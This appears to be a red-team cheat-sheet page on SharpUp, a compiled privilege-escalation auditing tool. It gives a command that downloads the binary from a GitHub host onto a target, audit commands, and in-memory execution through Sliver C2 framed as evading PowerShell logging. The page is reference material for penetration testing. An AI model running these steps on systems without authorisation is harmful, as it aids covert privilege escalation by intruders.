# 03.35 SharpUp

> C# port of PowerUp — compiled .NET binary, runs via execute-assembly, no PowerShell footprint.

## Overview

SharpUp is GhostPack's C# port of PowerUp. Same checks but compiled to a .NET binary, ideal for execute-assembly via Sliver/Cobalt or for environments where PowerShell is restricted or logged. Smaller surface than running PowerUp through AMSI/PowerShell logging.

## Steps

- **Step 1** - Get binary or compile from source.
- **Step 2** - Run on target — passes findings to stdout.
- **Step 3** - From C2, run inline via execute-assembly.

## Commands

### Get binary

```powershell
iwr 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe' -OutFile SharpUp.exe
```

### Run all checks

```powershell
SharpUp.exe audit
```

### Specific check categories

```powershell
SharpUp.exe audit HijackablePaths
SharpUp.exe audit UnquotedServicePath
SharpUp.exe audit ModifiableServices
SharpUp.exe audit AlwaysInstallElevated
SharpUp.exe audit RegistryAutoRuns
```

### Sliver execute-assembly

```text
[sliver] $ execute-assembly /opt/tools/SharpUp.exe audit
```
